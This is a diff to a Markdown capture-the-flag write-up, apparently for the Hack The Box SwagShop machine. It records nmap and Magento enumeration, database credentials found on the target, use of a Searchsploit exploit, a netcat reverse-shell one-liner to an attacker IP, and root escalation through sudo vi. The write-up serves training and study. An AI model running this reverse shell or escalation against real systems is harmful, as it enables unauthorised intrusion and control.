@@ -34,9 +34,12 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+---
+
 ## HTTP
 ![image](https://user-images.githubusercontent.com/83878909/230385940-576fb9d4-0154-4a75-af4c-ffeae45b4231.png)
 
+---
 
 ## Magento
 - Tool: [magescan](https://github.com/steverobbins/magescan)
@@ -50,6 +53,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ![image](https://user-images.githubusercontent.com/83878909/230406379-b3b0b66c-61ee-441d-93c7-dc25d708673c.png)
 ![image](https://user-images.githubusercontent.com/83878909/230406550-166475e5-9eb4-4f61-a20a-02d9a99e6496.png)
 - MySQL Credentials: `root:fMVWh7bDHpgZkyfqQXreTjU9` | DB Name: `swagshop`
+
+---
 
 ### Exploit
   - Searchsploit
@@ -70,6 +75,17 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   - Retrieve install date: `http://swagshop.htb/app/etc/local.xml`
 ![image](https://user-images.githubusercontent.com/83878909/230707818-894e563e-de27-4c7a-b528-cf3ec299b1cc.png)
   - Run Exploit
-  - Reverse Shell(Bash): `"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 9001 >/tmp/f"`
+  - Reverse Shell(Bash): `"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f"`
 ![image](https://user-images.githubusercontent.com/83878909/230712785-8d0eb9cb-b64b-458b-9764-0cee1e3cedfc.png)
 
+---
+
+### Privilege Escaltion
+  - Run: `sudo -l`
+![image](https://user-images.githubusercontent.com/83878909/230713433-59c5b31e-e861-4602-b6dd-79247b41906f.png)
+  - Can execute any file using `vi` as root located in `/var/www/html/*`.
+  - Create a file `a` or with any name, not neccissarily `a` using sudo.
+  - From within `Vi` spawn a sshell as bash. 
+![image](https://user-images.githubusercontent.com/83878909/230713860-7540abca-3e4d-4f80-b657-0c4b132fceb1.png)
+
+---
